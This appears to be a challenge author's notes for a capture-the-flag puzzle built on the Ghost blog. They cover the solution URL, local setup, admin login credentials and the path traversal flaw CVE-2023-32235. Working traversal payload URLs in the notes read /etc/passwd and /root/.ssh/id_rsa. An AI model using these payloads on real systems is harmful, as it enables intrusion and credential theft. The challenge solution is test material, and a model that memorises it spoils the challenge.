# solution

- http://ch.hackyeaster.com:2472/assets/built%2F..%2F..%2F/egg.png
- See https://github.com/VEEXH/Ghost-Path-Traversal-CVE-2023-32235- 


# setup

- To test it locally, you need to setup hackyeaster.com to point to localhost by editing /etc/hosts.
- On first run you will encounter a few db error from blog_1 until database mysql_1 is ready.
- PS: One can register to the blog as user (I setup mail functionality), but it's a rabbit hole.

# Notes 

## Admin

Admin under http://ch.hackyeaster.com:2407/ghost

User: `ghostbusters@octopoden.com`
PW: `!Q2&)Rui@s@HFwx`

## Vulnerability

CVE-2023-32235 

< 5.42.1

http://localhost:2368/assets/built%2F..%2F..%2F/package.json
http://localhost:2368/assets/built%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
http://localhost:2368/assets/built%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

http://localhost:2368/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa
http://localhost:2368/public/%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

/var/lib/ghost/versions/5.42.0/content/y§themes/casper

casper -> /var/lib/ghost/current/content/themes/casper


Admin: http://localhost:2368/ghost/#/dashboard